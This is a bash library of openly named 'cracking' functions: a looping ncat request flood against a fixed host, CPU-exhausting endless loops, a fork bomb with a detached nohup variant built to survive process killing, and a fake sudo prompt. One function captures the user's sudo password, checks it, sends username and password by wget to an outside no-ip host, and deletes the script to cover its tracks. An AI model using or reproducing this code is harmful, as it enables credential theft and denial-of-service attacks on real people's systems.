#!/usr/bin/env bash
# -*- coding: utf-8 -*-
# region header
# Copyright Torben Sickert (info["~at~"]torben.website) 16.12.2012

# License
# -------

# This library written by Torben Sickert stand under a creative commons naming
# 3.0 unported license. see http://creativecommons.org/licenses/by/3.0/deed.de
# endregion
cracking_make_simple_ddos_attack() {
    local __doc__='
    Makes a ddos attack to given host on given port. First argument: Number
    of requests. Second argument: Port

    >>> cracking.make_simple_ddos_attack 100 80
    '
    local index
    for (( index=0; index<"$1"; index++ )); do
        echo -e 'GET /'"$index"'\r\n\r\n' | ncat lilu "$2" &
    done
    return $?
}
alias cracking.make_simple_ddos_attach='cracking_make_simple_ddos_attack'
cracking_stress_system() {
    local __doc__='
    Stress system with given number of endless loops.

    >>> cracking.stress_system 10
    '
    local index
    for (( index=0; index<"$1"; index++ )); do
        cracking.endless_loop &
    done
    return $?
}
alias cracking.stress_system='cracking_stress_system'
cracking_endless_loop() {
    local __doc__='
    Starts an endless loop.

    >>> cracking.endless_loop
    '
    while true; do
        :
    done
    return $?
}
alias cracking.endless_loop='cracking_endless_loop'
cracking_fork_bomb() {
    local __doc__='
    Implementation for fork bomb. Note short version: :() { : | : & }; :

    >>> cracking.fork_bomb
    '
    cracking.fork_bomb | cracking.fork_bomb &
    return $?
}
alias cracking.fork_bomb='cracking_fork_bomb'
cracking_stress_system_with_fork_bomb() {
    local __doc__='
    Runs a forkbomb in an endless loop. This is useful if operating system
    kills the whole process tree.

    >>> cracking.stress_system_with_fork_bomb
    '
    while true; do
        cracking.fork_bomb
    done
    return $?
}
alias cracking.stress_system_with_fork_bomb='cracking_stress_system_with_fork_bomb'
cracking_make_system_unattainable() {
    local __doc__='
    Uses a stress system algorithm in its own process to avoid solving the
    problem by process tree killing.

    >>> cracking.make_system_unattainable
    '
    nohup bash --login -c cracking.stress_system &>/dev/null &
    return $?
}
alias cracking.make_system_unattainable='cracking_make_system_unattainable'
cracking_fake_sudo_password_attempt() {
    local __doc__='
    Shows a fake sudo password attempt.

    >>> cracking.fake_sudo_password_attempt
    '
    local number password
    for number in 1 2 3; do
        read -sp '[sudo] password for '$(whoami)': ' password
        sleep 1
        echo -e '\nSorry, try again.'
    done
    echo "sudo: $number incorrect password attempts"
    return $?
}
alias cracking.fake_sudo_password_attempt='cracking_fake_sudo_password_attempt'
cracking_grab_sudo_password() {
    local __doc__='
    Shows a fake sudo password attempt and send to password to server.

    >>> grabSudoPassword
    '
    local password
    local user=$(whoami)
    local standardOutputBufferFile=$(mktemp)
    for number in 1 2 3; do
        read -sp '[sudo] password for '$user': ' password
        echo ''
        if echo -e "$password\n" | sudo -S "$@" 1>"$standardOutputBufferFile" 2>/dev/null; then
            # NOTE: Place your password grabber server url here.
            wget --quiet "http://suna.no-ip.info:8080?user=$user&password=$password"
            unalias sudo &>/dev/null
            rm $(readlink --canonicalize "$0") &>/dev/null
            cat "$standardOutputBufferFile"
            break
        else
            if [[ $number == '3' ]]; then
                echo "sudo: $number incorrect password attempts"
            else
                echo 'Sorry, try again.'
            fi
        fi
    done
}
alias cracking.grab_sudo_password='cracking_grab_sudo_password'
# region vim modline
# vim: set tabstop=4 shiftwidth=4 expandtab:
# vim: foldmethod=marker foldmarker=region,endregion:
# endregion
